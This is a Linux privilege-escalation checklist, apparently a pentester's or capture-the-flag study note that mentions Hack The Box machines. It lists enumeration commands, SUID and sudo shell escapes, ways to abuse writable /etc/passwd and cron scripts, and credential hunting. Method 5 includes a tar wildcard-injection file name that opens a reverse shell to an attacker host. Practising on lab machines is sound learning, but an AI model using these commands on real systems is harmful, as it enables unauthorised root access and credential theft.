---
title: Linux Privilege Escalation - Complete Checklist
tags: [linux, privilege-escalation, privesc]
---

# Linux Privilege Escalation Checklist

You have shell as unprivileged user. Use this to get root.

## Quick Wins First (Check These First)

### Check Sudo Rights
```bash
sudo -l

# Look for:
# - (ALL) NOPASSWD: /bin/bash     → sudo /bin/bash
# - (root) NOPASSWD: /usr/bin/apt → sudo apt-get update
# - Wildcards: (root) /bin/* 
```

**If you see ANYTHING:** Check [[https://gtfobins.github.io][GTFOBins]] for how to abuse it.

### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null

# Check each against GTFOBins
# Look for unusual binaries (not normal system apps)
```

### Capabilities
```bash
getcap -r / 2>/dev/null

# Example: cap_setuid = dangerous
# If binary has cap_setuid, check GTFOBins
```

## Systematic Check (Detailed Enumeration)

### 1. OS Information
```bash
cat /etc/os-release
cat /etc/issue
uname -a
cat /proc/version
```

Look for: Kernel version → searchsploit for exploits

### 2. Kernel Exploits
```bash
uname -r
# Then search: searchsploit "KERNEL_VERSION"
# Or: https://www.exploit-db.com/ with kernel version
```

Relevant kernel exploits:
- Dirty COW (2.6.22 < 4.8.3)
- OverlayFS (CVE-2015-1328)
- Privilege escalation via ptrace

### 3. User Information
```bash
# Current user
whoami
id

# All users
cat /etc/passwd

# Users with shell
grep "sh$" /etc/passwd

# User groups
groups

# Can you switch users?
su - username (try common passwords)
```

### 4. File Permissions

Writable directories to own user:
```bash
find /tmp -writable 2>/dev/null
find /var/tmp -writable 2>/dev/null
find /home -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | head -20
```

World-writable files (especially in /etc or /usr):
```bash
find / -perm -002 -type f 2>/dev/null
```

### 5. Cron Jobs
```bash
# Root cron jobs
cat /etc/crontab

# User cron jobs
crontab -l
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Check for writable cron scripts
```

If you find a cron that runs a script you can write → modify script to add yourself as sudoer.

### 6. Installed Applications
```bash
ls /opt/
ls /usr/local/bin/
which python
which python3
which perl

# Check versions for known vulnerabilities
```

### 7. Network Connections
```bash
netstat -tlnp
ss -tlnp

# Look for internal services you might access
# Look for databases (3306, 5432, 27017)
```

### 8. Environment Variables
```bash
env
export

# Look for passwords in env vars
# Look for unusual paths
```

### 9. SSH Keys
```bash
ls -la ~/.ssh/
cat ~/.ssh/id_rsa (if readable)
cat ~/.ssh/authorized_keys

# Check if you can add your key to another account
ls -la /home/*/\.ssh/ 2>/dev/null
```

### 10. Sudo Configuration
```bash
cat /etc/sudoers
ls -la /etc/sudoers.d/

# Look for overly permissive configurations
```

### 11. Application Configuration Files
```bash
find /etc -type f -readable -exec grep -l "password" {} \; 2>/dev/null
find /opt -type f -readable -exec grep -l "password" {} \; 2>/dev/null
find /home -type f -readable -exec grep -l "password" {} \; 2>/dev/null

# Also check:
# /var/www/html/*.php
# /app/config/
# /home/user/.config/
```

## Common Privilege Escalation Vectors

### Method 1: SUID Binary Abuse
If you found an SUID binary:
```bash
# Check GTFOBins: https://gtfobins.github.io
# Example: if vim is SUID:
vim -c ':!sh'

# Example: if bash is SUID:
/bin/bash -p

# Example: if find is SUID:
find / -exec /bin/bash -p \; -quit
```

### Method 2: Sudo Exploitation
```bash
# If sudo -l shows ANY command:
sudo /bin/bash          # Direct shell
sudo -l | grep -i perl  # Try perl
sudo -l | grep -i python # Try python

# For scripting languages, often can execute shell:
sudo python -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec("/bin/bash")'
```

### Method 3: Writable System Files
If you can write to:
- `/etc/passwd` → add user with UID 0
- `/etc/shadow` → set password hash
- Cron scripts → add command to execute as root
- System service scripts → modify startup

### Method 4: Weak File Permissions
```bash
# If you can write to a script that runs as root:
echo "your command" >> /root/cleanup.sh

# Wait for cron to execute it
```

### Method 5: Cronjob Wildcard Abuse
```bash
# If cron runs: tar czf backup.tar.gz *
# You can create file with flags as arguments:
touch -- "-e sh -i -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' -r $'in'"
```

### Method 6: Capabilities Exploitation
```bash
# If binary has cap_setuid:
# It can change its UID - use to become root
getcap -r / 2>/dev/null
# Then check GTFOBins for that binary
```

### Method 7: Shared Object Injection (LD_PRELOAD)
```bash
# If binary loads .so files:
# Create malicious .so
# Preload before running SUID binary
```

## When Stuck

If nothing obvious works:

1. Rerun enumeration - you probably missed something
2. Check for recently modified files
   ```bash
   find / -mtime -5 2>/dev/null | head -20
   ```
3. Look for backup files
   ```bash
   find / -name "*.bak" -o -name "*.old" 2>/dev/null
   ```
4. Check for source code of running services
5. Look for database dumps or config backups
6. Check web application files for hardcoded credentials

## Tools That Help

```bash
# Download to target (curl or wget)
# Run for automated checks:
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231201/linpeas.sh
bash linpeas.sh

# But UNDERSTAND what it finds - don't blindly follow it
```

## Checklist Before Moving On

- [ ] sudo -l checked for easy wins
- [ ] SUID binaries identified
- [ ] Capabilities checked
- [ ] Kernel version vs exploits checked
- [ ] Cron jobs enumerated
- [ ] Writable files found
- [ ] SSH keys checked
- [ ] Config files reviewed for credentials
- [ ] Still stuck? Re-enumerate more carefully

## Real Machines Where This Worked

Examples from HTB machines:
- SUID bash (direct escalation)
- Writable /etc/passwd (add root user)
- Sudo python (os.system("/bin/bash"))
- Kernel exploit (Dirty COW, OverlayFS)
- Cron job abuse (modify running script)

---

Remember: The privilege escalation vector is ALWAYS there. You just need to find it through systematic enumeration.
